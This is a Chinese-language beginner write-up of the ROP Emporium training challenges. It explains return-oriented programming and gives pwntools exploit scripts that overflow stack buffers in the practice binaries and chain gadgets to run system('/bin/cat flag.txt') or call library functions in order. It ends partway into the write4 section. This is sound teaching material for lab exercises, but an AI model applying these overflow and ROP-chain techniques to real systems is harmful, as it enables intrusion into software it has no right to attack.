这个萌新向的文章，大佬可以出门左转离开了Orz
这是一个专门给萌新训练rop技巧的网站，题目比较简单同时也可以学到了很多新的有关rop的操作，每道题目都有分32位和64位两种版本的，对32/64位的程序都能得到很好的练习
题目网站：[ropemporium](https://ropemporium.com/)
在做题之前需要先了解一波rop的相关基础理论
rop的全称是：返回导向编程（Return-Oriented Programming）
一般在利用栈溢出的时候会利用到，rop通常是由许多个gadget组成的，而gadget是程序中的一小段指令
比如这种：`pop xxx；ret`即将栈上的值传递给寄存器的一段汇编指令
或者这些：`mov ecx,[eax]; ret` `int 0x80; ret` `leave; ret`
找gadget的时候可以使用[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)这个工具
总的来说，就是把多个gadget串起来，达到寄存器传值，任意地址写，保持栈平衡，调用函数的目的
一般将rop部署在栈的返回地址处，而64位和32位的程序有所有不同，构造rop的时候相应的操作也不一样
  * 32位程序的参数是放在栈里面的
  * 64 位程序的前六个参数放在 RDI、RSI、RDX、RCX、R8 和 R9 中后续还有多的才放入栈中。
因此32位的程序用gadget一般是为了保持栈的平衡，而64位程序用gadget一般是为了将调用函数的参数放入rdi、rsi、rdx等寄存器中
# 1.ret2win
我们先来看看这题：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      setvbuf(_bss_start, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      puts("ret2win by ROP Emporium");
      puts("64bits\n");
      pwnme("64bits\n", 0LL);
      puts("\nExiting");
      return 0;
    }
    char *pwnme()
    {
      char s; // [rsp+0h] [rbp-20h]
      memset(&s, 0, 0x20uLL);
      puts(
        "For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n"
        "What could possibly go wrong?");
      puts("You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n");
      printf("> ", 0LL);
      return fgets(&s, 50, stdin);//漏洞所在
    }
    int ret2win()
    {//未被调用的函数，执行后可以直接得到flag
      printf("Thank you! Here's your flag:");
      return system("/bin/cat flag.txt");
    }
发现fgets函数可读入50个字节，但s的栈空间似乎只有0x20，那么肯定存在栈溢出漏洞
这时只要填满0x20个字符串加上八个字节的ebp，然后加上一个ret2win函数的地址，即可得到flag
exp如下
    #!/usr/bin/python 
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    p = process("./ret2win")
    ret2win = 0x400811
    payload = 'a'*(0x20+0x08) +p64(ret2win)
    p.sendline(payload)
    p.interactive()
# 2.ret2win32
题目的描述和64位的基本上是一样的
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      setvbuf(stdout, 0, 2, 0);
      setvbuf(stderr, 0, 2, 0);
      puts("ret2win by ROP Emporium");
      puts("32bits\n");
      pwnme();
      puts("\nExiting");
      return 0;
    }
    char *pwnme()
    {
      char s; // [esp+0h] [ebp-28h]
      memset(&s, 0, 0x20u);
      puts(
        "For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n"
        "What could possibly go wrong?");
      puts("You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n");
      printf("> ");
      return fgets(&s, 50, stdin);//漏洞所在
    }
    int ret2win()
    {//未被调用的函数，执行后可以直接得到flag
      printf("Thank you! Here's your flag:");
      return system("/bin/cat flag.txt");
    }
exp如下，需要注意的是32位的ebp的大小是4个字节，而64位的程序的ebp是8个字节
    #!/usr/bin/python 
    #coding:utf-8
    from pwn import *
    p = process("./ret2win32")
    ret2win = 0x08048659
    payload = 'a'*(0x28+0x04) +p32(ret2win)
    p.sendline(payload)
    p.interactive()
# 3.split
先来看看从ida反编译的结果
    char *pwnme()
    {
      char s; // [rsp+0h] [rbp-20h]
      memset(&s, 0, 0x20uLL);
      puts("Contriving a reason to ask user for data...");
      printf("> ", 0LL);
      return fgets(&s, 96, stdin);//漏洞所在，造成栈溢出
    }
    int usefulFunction()
    {
      return system("/bin/ls");
    }
这里可以看到，还是存在一个栈溢出的漏洞，但是usefulFunction函数并不能帮助我们拿到flag，那么我们就得自己构造system(xxx)
但参数填什么呢？
IDA中使用快捷键shift+f12可以直接看到程序中的所有字符串
我们发现这里有个有用的字符串可以当做参数
    .data:0000000000601060                 public usefulString
    .data:0000000000601060 usefulString    db '/bin/cat flag.txt',0
    .data:0000000000601072                 db    0
    .data:0000000000601073                 db    0
    .data:0000000000601074                 db    0
那我们需要构造的就是：system(/bin/cat flag.txt)
由于这个是64位的程序，rdi是存储函数第一个参数的
因此需要用到pop rdi；ret这个gadget
通过命令：`ROPgadget --binary ./split --only "pop|ret"`找到gadget
    0x000000000040087c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040087e : pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000400880 : pop r14 ; pop r15 ; ret
    0x0000000000400882 : pop r15 ; ret
    0x000000000040087b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040087f : pop rbp ; pop r14 ; pop r15 ; ret
    0x00000000004006b0 : pop rbp ; ret
    0x0000000000400883 : pop rdi ; ret  //这个就是我们所需要的gadget
    0x0000000000400881 : pop rsi ; pop r15 ; ret
    0x000000000040087d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    0x00000000004005b9 : ret
接着paylode的构造就简单了，填充0x28个字符到返回地址后使用pop_rdi_ret将参数传入rdi寄存器中，接着执行system函数即可
exp如下：
    #!/usr/bin/python
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    p = process('./split')
    catflag = 0x601060
    system = 0x4005e0
    pop_rdi_ret = 0x400883
    payload = 'a'*(0x20 + 0x08) + p64(pop_rdi_ret) +p64(catflag)+p64(system)
    p.sendline(payload)
    p.interactive()
# 4\. split32
题目的描述和上面64位 的是一样的，只需要主要32位的程序，函数的参数是放在栈上的，那也就不需要使用到gadget，直接覆盖返回地址后再将参数填入栈中即可
    #!/usr/bin/python
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    p = process('./split32')
    catflag = 0x0804a030
    system = 0x08048430
    payload = 'a'*(0x28+0x04) +p32(system)+'aaaa'+p32(catflag)
    p.sendline(payload)
    p.interactive()
# 5.callme
从反编译的代码来看：
    char *pwnme()
    {
      char s; // [rsp+0h] [rbp-20h]
      memset(&s, 0, 0x20uLL);
      puts("Hope you read the instructions...");
      printf("> ", 0LL);
      return fgets(&s, 256, stdin);
    }
    void __noreturn usefulFunction()
    {
      callme_three(4LL, 5LL, 6LL);
      callme_two(4LL, 5LL, 6LL);
      callme_one(4LL, 5LL, 6LL);
      exit(1);
    }
除了和之前一样的栈溢出漏洞以外，这个usefulFunction函数显得没有卵用
于是去看看官方的提示：
看来，这题的要求是：依次调用one，two，three函数，参数是1，2，3，这样就可以出flag了，不用去管文件夹中的`encrypted_flag.txt`
`key1.dat` `key2.dat` `libcallme.so`
但也别删除了，会影响题目正常逻辑的
这题的主要考察点是对rop调用函数顺序和设置参数
那根据之前题目中提到的，找好gadget和相关函数的地址，就可以开始写rop的构造了
    #!/usr/bin/python
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    p = process('./callme')
    elf = ELF('./callme')
    pop_rdi_ret = 0x00401b23
    pop_rsi_rdx_ret = 0x401ab1
    callone = 0x401850
    calltwo = 0x401870
    callthree = 0x401810
    #调用callme_one(1,2,3)
    payload = 'a'*(0x20 + 0x08)
    payload += p64(pop_rdi_ret) + p64(1)+ p64(pop_rsi_rdx_ret)+p64(2)+p64(3)+p64(callone)
    #调用callme_two(1,2,3)
    payload += p64(pop_rdi_ret) + p64(1)+ p64(pop_rsi_rdx_ret)+p64(2)+p64(3)+p64(calltwo)
    #调用callme_three(1,2,3)
    payload += p64(pop_rdi_ret) + p64(1)+ p64(pop_rsi_rdx_ret)+p64(2)+p64(3)+p64(callthree)
    p.sendline(payload)
    p.interactive()
# 6.callme32
原理同上，但与上面64位不同的是，这里的`pop_esi_edi_ebp_ret`并不是传参数的作用，而是为了保持栈的平衡，把p32(1)+p32(2)+p32(3)弹出去，从而实现下一次的rop函数调用
**栈平衡 是指保证压栈操作和弹栈操作要相对应，保证栈指针一直指向所定义的栈空间。**
比如
payload += p32(callone)+p32(pop_esi_edi_ebp_ret)+p32(1)+p32(2)+p32(3)
其中pop esi是为了把p32(1)弹出栈，pop edi是为了把p32(2)弹出栈，pop edi是为了把p32(3)弹出栈
最后一个ret指令相当于 pop eip
也就是把栈顶的内容传给eip，从而改变执行流程
在执行之前三次pop后，esp已经指向了p32(calltwo)
这时就可以接着去指向第二段rop从而顺利调用callme_two(1,2,3)
依次类推，执行callme_three(1,2,3)
exp如下：
    #!/usr/bin/python
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    p = process('./callme32')
    pop_esi_edi_ebp_ret = 0x080488a9
    callone = 0x080485c0
    calltwo = 0x08048620
    callthree = 0x080485b0
    main = 0x0804873b
    payload = 'a'*(0x28 + 0x04)
    payload +=  p32(callone)+p32(pop_esi_edi_ebp_ret)+p32(1)+p32(2)+p32(3)
    payload +=  p32(calltwo)+p32(pop_esi_edi_ebp_ret)+p32(1)+p32(2)+p32(3)
    payload +=  p32(callthree)+p32(0xdeadbeef)+p32(1)+p32(2)+p32(3)
    p.sendline(payload)
    p.interactive()
如果对此不太好理解，可以进入gdb一步步跟着调试，可以看清楚具体的流程
# 7.write4
从IDA来看
    int __cdecl main(int argc, const char **argv, const char **envp)